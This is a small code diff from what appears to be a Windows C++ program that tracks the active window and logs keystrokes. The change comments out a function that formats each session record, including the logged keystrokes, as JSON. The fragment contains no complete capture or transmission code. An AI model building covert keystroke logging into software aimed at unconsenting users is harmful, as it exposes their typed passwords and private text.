@@ -137,10 +137,11 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
     }
 }
 
-string Entry::toString() {
+
+/*string Entry::toString() {
 	string temp = "{\"active_process\": \"" + programName + "\", \"process_id\": \"" + procid + "\", \"start_time\": \"" + startTime + "\", \"end_time\": \"" + endTime + "\", \"session_duration\": \"" + duration + "\", \"logged_keystrokes\": \"" + text + "\"}";
 	return temp;
-}
+} */
 
 // function triggered whenever a window becomes active
 void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
